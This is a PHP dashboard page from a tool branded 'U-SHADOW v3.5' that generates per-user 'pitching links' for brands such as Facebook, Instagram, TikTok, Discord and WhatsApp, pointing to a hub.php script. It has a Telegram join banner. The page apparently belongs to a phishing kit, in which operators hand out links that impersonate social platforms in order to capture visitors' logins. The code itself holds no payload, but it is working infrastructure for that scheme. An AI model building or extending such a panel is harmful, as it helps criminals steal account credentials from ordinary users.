<?php
require_once __DIR__ . '/config.php';
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
$user = $_SESSION['user'];

$categories_raw = json_decode(file_get_contents(CATEGORIES_FILE), true);
$categories = [];
foreach ($categories_raw as $cat) {
    if (is_array($cat)) {
        $categories[] = $cat;
    } else {
        $categories[] = ['name' => $cat, 'image' => ''];
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-SHADOW | Dashboard</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><path d=%22M50 5 L95 50 L50 95 L5 50 Z%22 fill=%22%23333%22 stroke=%22%23eee%22 stroke-width=%225%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22 font-family=%22Arial%22>U</text></svg>">
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="old-dashboard-body">

<div class="container-old">
    <header class="header-old">
        <div class="brand-top">U-SHADOW</div>
        <div class="telegram-banner">
             <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
                <i class="fab fa-telegram"></i> Join Our Telegram
             </a>
        </div>
    </header>

    <nav class="navbar-old">
        <ul>
            <li><a href="dashboard.php"><i class="fas fa-home"></i> Home</a></li>
            <li><a href="signup.php" style="display: none;"><i class="fas fa-user-plus"></i> Sign Up</a></li>
            <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
            <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
            <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
            <li><a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
        </ul>
    </nav>

    <main class="main-old">
        <div class="breadcrumb-old">.: Dashboard :.</div>
        <div class="welcome-msg">
            Welcome back, <strong><?php echo s($user['username']); ?></strong>!<br>
            Select a brand below to generate your unique pitching link.
        </div>

        <section class="panel-old">
            <div class="panel-header-old">Generate Links</div>
            <div class="panel-body-old">
                <p>Select a category to generate your pitching link:</p>
                <div class="link-list-vertical">
                    <?php
                    $icons = [
                        'facebook' => 'fa-brands fa-facebook',
                        'instagram' => 'fa-brands fa-instagram',
                        'tiktok' => 'fa-brands fa-tiktok',
                        'snapchat' => 'fa-brands fa-snapchat',
                        'telegram' => 'fa-brands fa-telegram',
                        'discord' => 'fa-brands fa-discord',
                        'twitter' => 'fa-brands fa-twitter',
                        'x' => 'fa-brands fa-x-twitter',
                        'youtube' => 'fa-brands fa-youtube',
                        'pinterest' => 'fa-brands fa-pinterest',
                        'linkedin' => 'fa-brands fa-linkedin',
                        'whatsapp' => 'fa-brands fa-whatsapp',
                        'slack' => 'fa-brands fa-slack',
                        'twitch' => 'fa-brands fa-twitch',
                        'spotify' => 'fa-brands fa-spotify'
                    ];
                    foreach ($categories as $cat):
                        $cat_name = $cat['name'];
                        $cat_image = $cat['image'];
                        $cat_clean = str_replace(' ', '', strtolower($cat_name));
                        $icon_class = $icons[$cat_clean] ?? 'fa-solid fa-link';
                        $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/hub.php?cat=" . $cat_clean . "&user=" . urlencode($user['username']);
                    ?>
                        <div class="link-row-old">
                            <div class="link-row-link">
                                <div class="copy-container-old" style="margin: 0;">
                                    <input type="text" value="<?php echo s($generated_link); ?>" id="link-<?php echo $cat_clean; ?>" readonly>
                                    <button onclick="copyLink('link-<?php echo $cat_clean; ?>', this)">Copy</button>
                                </div>
                            </div>
                            <div class="link-row-info">
                                <?php if ($cat_image): ?>
                                    <img src="<?php echo s($cat_image); ?>" alt="<?php echo s($cat_name); ?>" class="hub-logo-tiny">
                                <?php else: ?>
                                    <i class="<?php echo $icon_class; ?>" style="font-size: 16px; margin-right: 8px;"></i>
                                <?php endif; ?>
                                <strong><?php echo s($cat_name); ?></strong>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer-old">
        Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
        <strong>U-SHADOW v3.5 &copy;</strong>
    </footer>
</div>

<script>
function copyLink(id, btn) {
    var copyText = document.getElementById(id);
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);

    var originalText = btn.innerHTML;
    btn.innerHTML = "Copied!";
    setTimeout(function() {
        btn.innerHTML = originalText;
    }, 1500);
}
</script>

</body>
</html>
